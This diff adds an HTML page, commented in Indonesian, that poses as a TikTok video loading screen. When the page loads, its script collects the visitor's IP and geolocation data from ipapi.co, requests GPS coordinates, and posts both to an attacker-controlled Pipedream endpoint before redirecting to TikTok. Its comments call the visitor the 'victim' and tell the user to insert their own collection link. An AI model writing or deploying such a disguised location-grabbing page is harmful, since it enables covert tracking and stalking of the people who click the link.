@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading TikTok...</title>
+</head>
+<body style="background:black; color:white; text-align:center; padding-top:20%;">
+    <p>Memuat Video...</p>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetUrl = urlParams.get('url') || 'https://www.tiktok.com';
+        
+        // --- GANTI LINK DI BAWAH INI DENGAN LINK PIPEDREAM KAMU ---
+        const kotakSurat = 'https://eob426ci9b9rua6.m.pipedream.net'; 
+
+        async function ambilData() {
+            // Ambil data IP korban dulu
+            let data = { info: "Target Mengklik Link" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                data = await res.json();
+            } catch (e) {}
+
+            // Kirim data IP ke Pipedream
+            await fetch(kotakSurat, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+
+            // Minta Lokasi (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    // Kalau diizinkan, kirim koordinatnya ke Pipedream
+                    await fetch(kotakSurat, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        })
+                    });
+                    window.location.href = targetUrl;
+                }, () => {
+                    window.location.href = targetUrl;
+                });
+            } else {
+                window.location.href = targetUrl;
+            }
+        }
+        window.onload = ambilData;
+    </script>
+</body>
+</html>
